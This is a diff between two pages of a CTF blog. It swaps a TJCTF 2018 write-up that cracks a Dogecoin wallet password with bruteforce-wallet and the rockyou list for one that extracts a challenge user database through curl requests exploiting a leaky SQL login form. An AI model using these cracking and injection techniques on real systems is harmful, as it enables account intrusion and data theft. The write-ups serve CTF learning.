@@ -83,7 +83,7 @@
 <link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="tjctf-2018,write-up,forensics," />
+  <meta name="keywords" content="tjctf-2018,write-up,web," />
 
 
 
@@ -110,16 +110,19 @@
 
 
 <meta name="description" content="">
-<meta name="keywords" content="tjctf-2018, write-up, forensics">
+<meta name="keywords" content="tjctf-2018, write-up, web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TJCTF - We Will Rock You">
-<meta property="og:url" content="/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/">
+<meta property="og:title" content="TJCTF - Ess Kyoo Ell">
+<meta property="og:url" content="/2018/08/12/TJCTF-Write-Up-Ess-Kyoo-Ell/">
 <meta property="og:site_name" content="Pxmme">
 <meta property="og:description" content="">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="/imgs/login.png">
+<meta property="og:image" content="/imgs/error.png">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="TJCTF - We Will Rock You">
+<meta name="twitter:title" content="TJCTF - Ess Kyoo Ell">
 <meta name="twitter:description" content="">
+<meta name="twitter:image" content="/imgs/login.png">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -152,7 +155,7 @@
 
 
 
-  <title>TJCTF - We Will Rock You | Pxmme</title>
+  <title>TJCTF - Ess Kyoo Ell | Pxmme</title>
   
 
 
@@ -275,7 +278,7 @@
   
 
   <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="/2018/08/12/TJCTF-Write-Up-We-Will-Rock-You/">
+    <link itemprop="mainEntityOfPage" href="/2018/08/12/TJCTF-Write-Up-Ess-Kyoo-Ell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Pxmme">
@@ -295,7 +298,7 @@
           <h1 class="post-title" itemprop="name headline">
           
           
-            TJCTF - We Will Rock You
+            TJCTF - Ess Kyoo Ell
           
         </h1>
         
@@ -309,7 +312,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-12T02:00:03+02:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-12T02:00:10+02:00">
                 2018-08-12
               </time>
             
@@ -369,60 +372,61 @@
 
 <h2 id="challenge">Challenge</h2>
 
-<p>Help! I lost the password to my Dogecoin wallet. I had like 10 Dogecoin in there. If you get the password, you’ll get the flag! Flag format: tjctf{password}</p>
+<p>Find the IP address of the admin user! (flag is tjctf{[ip]})</p>
 
-<p>[75 points]</p>
+<p>[40 points]</p>
 
-<p><em>Written by Alaska47</em></p>
+<p><em>Written by okulkarni</em></p>
 
 <h2 id="initial-thoughts">Initial thoughts</h2>
 
-<p>Seeing the name of the challenge, I immediately thought about the <em>infamous</em> rockyou.txt list of passwords. For those of you who don’t know it, it’s this huge list of passwords that was created out of real, leaked passwords.</p>
-
-<p>It’s natively present in Kali, check <em>/usr/share/wordlists</em> and you’ll find a <em>rockyou.txt.gz</em> :)</p>
-
-<p>So I assumed I’d have to bruteforce this wallet in order to retrieve the password. I googled for “wallet bruteforce” and found glv2’s <a href="https://github.com/glv2/bruteforce-wallet" title="Click here to learn more!">Github magic thingy</a>.</p>
+<p>That challenge name is pretty obvious : we’re going to have to exploit some poorly configured SQL.</p>
 
 <h2 id="exploitation">Exploitation</h2>
 
-<p>First off, let’s clone this github repo.</p>
-<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>~# git clone https://github.com/glv2/bruteforce-wallet
+<p><img src="/imgs/login.png" alt="Login" class="img-responsive" /></p>
+
+<p>We are presented with a quite simple login page. Let’s try some things! I will see what <strong>email=a@a.a</strong> and <strong>password=1</strong> give me.</p>
+
+<p><img src="/imgs/error.png" alt="Error" class="img-responsive" /></p>
+
+<p>Uh. Interesting. The script is made so that we can get any error message (or anything else) SQL returns. This should be easy to exploit.</p>
+
+<p>Let’s switch to curl, shall we?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>~# curl --data "email=a@a.a&amp;&amp;password=1" https://ess-kyoo-ell.tjctf.org/ | grep database
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7603    0  7580  100    23  17710     53 --:--:-- --:--:-- --:--:-- 17764
+            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: no such column: password&lt;/p&gt;
 </code></pre></td></tr></tbody></table></div>
 </div>
-<p>Let’s install the dependencies required :</p>
-<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>~# apt install libdb-dev libssl-dev -y
+
+<p>Thanks to grep, we got the line that matters. Now let’s try some basic SQL column’s name instead of the given parameters email &amp;&amp; password.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>~# curl --data "id=1" https://ess-kyoo-ell.tjctf.org/ | grep database
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8076    0  8072  100     4  20383     10 --:--:-- --:--:-- --:--:-- 20445
+            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;hdavidovsky0&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Hamnet&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;Davidovsky&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e48c8085928d808b92978f9dd4a4978885978c808b90ca8b9683"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Male&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;202.100.56.108&amp;#39;}&lt;/p&gt;
 </code></pre></td></tr></tbody></table></div>
 </div>
-<p>Let’s then try to install it following the README’s instructions.</p>
-<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2</pre></td><td class="code"><pre class="highlight"><code>~# cd bruteforce-wallet &amp;&amp; ./autogen.sh
-./autogen.sh: 6: ./autogen.sh: autoreconf: not found
+
+<p>Uh, uh! Seems like we got a hit! Pretty easily nevertheless. Well, now we know that it will return any column value we ask for, aaaand… We know all the columns ids. Since we need to retrieve the <strong>administrator’s</strong> IP address, let’s ask for his column!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>~# curl --data "username=admin" https://ess-kyoo-ell.tjctf.org/ | grep database
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  8086    0  8072  100    14  16746     29 --:--:-- --:--:-- --:--:-- 16775
+            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 706, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Administrative&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;User&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="187c7d7e3576776c356c702b35797c752976586c727b6c7e36776a7f"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Female&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;145.3.1.213&amp;#39;}&lt;/p&gt;
 </code></pre></td></tr></tbody></table></div>
 </div>
-<p>Oops! Seems I need to install a package first.</p>
-<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6</pre></td><td class="code"><pre class="highlight"><code>~# apt-get install autoconf
-~# ./autogen.sh
-configure.ac:6: installing './compile'
-configure.ac:2: installing './install-sh'
-configure.ac:2: installing './missing'
-Makefile.am: installing './depcomp'
-</code></pre></td></tr></tbody></table></div>
-</div>
-<p>Then a ./configure, make and make install and we’re good! Now, let’s use our new little tool :3</p>
-<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8</pre></td><td class="code"><pre class="highlight"><code>~# bruteforce-wallet -t 6 -f /root/Documents/rockyou.txt 9d7e6203fb6e2c14646c63bea94e48001b9317c86bec229c3e063904a168dfad_wallet.dat
-Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
- 
-Tried passwords: 59
-Tried passwords per second: 59,000000
-Last tried password: samantha
- 
-Password found: tinkerbell
-</code></pre></td></tr></tbody></table></div>
-</div>
-<p>Got it! Password is “tinkerbell”, hereby flag is : <code class="highlighter-rouge">tjctf{tinkerbell}</code></p>
+
+<p>Well, well, well… Here it is! Flag is : <code class="highlighter-rouge">tjctf{145.3.1.213}</code></p>
 
 <h2 id="after-thoughts">After thoughts</h2>
 
-<p>A very basic challenge worth a lot of points compared to other ones in this TJCTF. Still, I enjoyed the five minutes it took me, as I never had to bruteforce a coin-wallet before. Valuable experience!</p>
+<p>A pretty basic web challenge to be honest but still refreshing and nice to complete. I already had encountered such challenges in the past but it took me a little while to get back to it and figure it out, so… All in all, it was worth it!</p>
 
 
       
@@ -460,7 +464,7 @@ Password found: tinkerbell
             <a href="/tag/#/write-up" rel="tag"># write-up</a>
           
             
-            <a href="/tag/#/forensics" rel="tag"># forensics</a>
+            <a href="/tag/#/web" rel="tag"># web</a>
           
         </div>
       
@@ -476,8 +480,8 @@ Password found: tinkerbell
         <div class="post-nav" id="post-nav-id">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/12/TJCTF-Write-Up-Huuuuuge/" rel="next" title="TJCTF - Huuuuuge">
-                <i class="fa fa-chevron-left"></i> TJCTF - Huuuuuge
+              <a href="/2018/08/12/TJCTF-Write-Up-RC4-took-an-L/" rel="next" title="TJCTF - RC4 took an L">
+                <i class="fa fa-chevron-left"></i> TJCTF - RC4 took an L
               </a>
             
           </div>
@@ -486,8 +490,8 @@ Password found: tinkerbell
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/12/TJCTF-Write-Up-Weird-Logo/" rel="prev" title="TJCTF - Weird Logo">
-                TJCTF - Weird Logo <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/12/TJCTF-Write-Up-Blank/" rel="prev" title="TJCTF - Blank">
+                TJCTF - Blank <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
